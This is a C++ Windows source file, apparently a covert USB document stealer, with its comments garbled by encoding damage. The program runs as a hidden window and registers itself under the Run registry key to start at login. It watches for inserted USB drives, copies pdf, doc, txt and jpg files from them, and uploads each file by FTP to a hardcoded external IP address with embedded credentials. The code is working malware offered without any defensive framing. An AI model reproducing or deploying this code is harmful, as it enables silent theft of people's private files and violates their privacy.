#include<iostream>
#include<fstream>
#include<cstring>
#include<io.h>
#include<tchar.h>
#include<direct.h>
#include<afxinet.h>//ftp֧��
#include<Windows.h>
#include<dbt.h>

#define DESTEST "d:/temp/"//Ŀ��Ŀ¼
#define FTP "45.77.210.206"
#define PASSWD "daojianshenyu"
#define USER "ftpuser"

#pragma comment  (lib,"User32.lib")  //���ڻ����ֵ�֧��
#pragma comment  (lib,"Gdi32.lib") //���ڻ����ֵ�֧��
#pragma comment (lib,"Advapi32.lib")//����֧��ע���༭
std::string USB;//USB�̷�
CInternetSession session("FTP server");
CFtpConnection* Pftp;

using namespace std;


bool TestInet() {//������ͨ����
	Pftp = session.GetFtpConnection(FTP, USER, PASSWD);
	if (Pftp == 0) { Pftp->Close(); delete Pftp; return false; }
	if (Pftp->GetFile("test", "d:/temp/test", FALSE, FILE_ATTRIBUTE_NORMAL, FTP_TRANSFER_TYPE_UNKNOWN))
		return true;
	else { Pftp->Close(); delete Pftp; return false;}
}



void SetAutoRun(bool bAutoRun) {//���ÿ�������
	HKEY hKey;//����ע����ֵָ��
	const char* strRegPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";//�ƶ�ע����ֵĿ¼
	if (bAutoRun) {
		if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {//���Դ򿪸ü�ֵ
			TCHAR szModul[_MAX_PATH];//���Դ洢����������λ��
			GetModuleFileName(NULL, szModul, _MAX_PATH);//��ñ���������Ŀ¼
			RegSetValueEx(hKey, "autorun", 0, REG_SZ, (const BYTE*)(LPCSTR)szModul, strlen(szModul));//ע�Ὺ��������ֵ
			RegCloseKey(hKey);//�ر�ע���
			//MessageBox(NULL, "�����������óɹ�", "Notice", MB_OK);
		}
		else {
			//MessageBox(NULL,"ϵͳ���������޷���ϵͳ����","Notice",MB_OK);
		}
	}
	else {//ȡ����������
		if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {//���Դ�ע����ֵ
			RegDeleteKeyValue(hKey,NULL,"autorun");//ɾ����������
			RegCloseKey(hKey);//�ر�ע���
			//MessageBox(NULL, "���������ѹر�", "Notice", MB_OK);
		}
	}

}


std::string GetUSBroot()//USB�̷���ȡ����
{
	std::string UDiskRoot = "";
	UINT DiskType;
	size_t szAllDriveStr = GetLogicalDriveStrings(0, NULL);
	char *pDriveStr = new char[szAllDriveStr + sizeof(_T(" "))];
	char *pForDelete = pDriveStr;
	GetLogicalDriveStrings(szAllDriveStr, pDriveStr);
	size_t szDriveStr = strlen(pDriveStr);
	while (szDriveStr > 0)
	{
		DiskType = GetDriveType(pDriveStr);
		switch (DiskType)
		{
		case DRIVE_NO_ROOT_DIR:
			break;
		case DRIVE_REMOVABLE:
			// �ƶ��洢�豸  
			UDiskRoot = pDriveStr;
			break;
		case DRIVE_FIXED:
			// �̶�Ӳ��������  
			break;
		case DRIVE_REMOTE:
			// ����������  
			break;
		case DRIVE_CDROM:
			// ����������  
			break;
		}

		pDriveStr += szDriveStr + 1;
		szDriveStr = strlen(pDriveStr);
	}
	delete pForDelete;
	return UDiskRoot;
}



void FileSearch(std::string Path,int Layer) {
	_finddata_t file_info;//�����ļ���
	std::string current_path = Path + "/*.*";//�����ַ������Դ�ŵ�ǰĿ¼
	int handle;//�ļ�����
	if ((handle = _findfirst(current_path.c_str(), &file_info)) != -1) {
		do {
			if (file_info.attrib == _A_SUBDIR) {//�ж��ļ����� Ŀ¼
				if (strcmp(file_info.name, ".") != 0 && strcmp(file_info.name, "..") != 0) {
					FileSearch(Path + '/' + file_info.name, Layer + 1);
				}
			}
			else {//�ж��ļ����� �ļ�
				std::string file;
				std::string dest;
				file = file_info.name;
				if (file.find(".pdf") != file.npos || //pdf copy
					file.find(".doc") != file.npos || //doc copy
					file.find(".docx") != file.npos ||//docx copy
					file.find(".txt") != file.npos ||//txt copy
					file.find(".jpg") != file.npos) {//jpg copy
					dest = DESTEST + file;
					file = Path + '/' + file_info.name;
					if (_access(DESTEST, 00) == 0) {
						CopyFile(file.c_str(), dest.c_str(), FALSE);//�ж�Ŀ���ļ����Ƿ����
						if (TestInet()) Pftp->PutFile(dest.c_str(), file_info.name, FTP_TRANSFER_TYPE_UNKNOWN);
						//��������ftp������������
					}
					else {//������ �ȴ����ٸ���
						_mkdir(DESTEST);
						CopyFile(file.c_str(), dest.c_str(), FALSE);
						if (TestInet()) Pftp->PutFile(dest.c_str(), file_info.name, FTP_TRANSFER_TYPE_UNKNOWN);
						//��������ftp������������
					}
					Sleep(250);//��ͣ ��ֹ����ռ������
				}
			}
		} while (!_findnext(handle, &file_info));
		_findclose(handle);
	}
	else {
		return;
	}
}



LRESULT OnDeviceChange(HWND hwnd,WPARAM wParam,LPARAM lParam){
	PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;
	/*
	wParam�д洢��WM_DEVICECHANGE ���루DBT_DEVICEARRIVAL���Ƴ���DBT_DEVICEREMOVECOMPLETE��
	lParamΪָ�룬ָ��洢����豸��ϸ����Ϣ
		�豸����ϸ���
	*/
	switch (wParam) {
	case DBT_DEVICEARRIVAL://������Ϣ
		//MessageBox(NULL, "USB arrived!", "NOTICE", MB_OK);
		if (lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME) {
			PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
			USB.clear();
			USB =GetUSBroot()+'/';//��ȡUSB�̷�
			FileSearch(USB, 0);//�����ļ�������
		}
		break;
	case DBT_DEVICEREMOVECOMPLETE://�Ƴ���Ϣ
		//MessageBox(NULL, "USB removed!", "Notice!", MB_OK);
		break;
	}
	return LRESULT();

}



LRESULT CALLBACK WndProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam) {//��Ϣ������
	switch (Message)
	{
	case WM_CREATE://���崴����Ϣ
		SetAutoRun(true);//���ÿ�������
		_mkdir(DESTEST);//system("mkdir d:\\temp");//����Ŀ��Ŀ¼
		break;
	case WM_DESTROY://���������Ϣ
		SetAutoRun(false);
		PostMessage(hwnd, WM_QUIT, wParam, lParam);//���ͽ�����Ϣ��ϵͳ
		break;
	case WM_TIMER://Timer��Ϣ ����
		break;
	case WM_DEVICECHANGE://�豸�����Ϣ
		OnDeviceChange(hwnd, wParam, lParam);
		break;
	default: 
		return DefWindowProc(hwnd, Message, wParam, lParam);//windowsĬ����Ϣ������
		break;
	}
	return 0;
}



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	WNDCLASS wc;//����������
	HWND hwnd;//����������
	MSG msg;//������Ϣ

	wc.cbClsExtra = NULL;//�趨����̨���⻺����
	wc.cbWndExtra = NULL;//�趨���ڴ��ڶ��⻺����
	wc.hbrBackground =(HBRUSH) COLOR_WINDOW;//�趨���ڱ���ɫ��ʽ
	wc.hCursor = NULL;//�趨�����ʽ
	wc.hIcon = NULL;//�趨ͼ����ʽ
	wc.hInstance = hInstance;//�趨ʵ�����
	wc.lpszClassName = "Explore";//����������
	wc.lpszMenuName = NULL;//�趨�˵�����
	wc.style = NULL; //�趨������ʽ����Ӧ����Ϣ
	wc.lpfnWndProc = WndProc;//�趨��Ϣ�ص�����
	
	if (!RegisterClass(&wc)) {
		MessageBox(NULL, "Windows Registration Faild", "ERROR", MB_OK);
		return 0;
	}//ע�ᴰ����

	hwnd = CreateWindow(wc.lpszClassName, "Test", WS_DISABLED, 0, 0, 100, 100, NULL, NULL, hInstance, NULL);
	if (hwnd == NULL) {
		MessageBox(NULL, "Creating Windows Failed", "ERROR", MB_OK);
		return 0;
	}//��������

	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);//ת����Ϣ��ʽ
		DispatchMessage(&msg);//����Ϣ����������
	}//��Ϣ����
	return msg.wParam;
}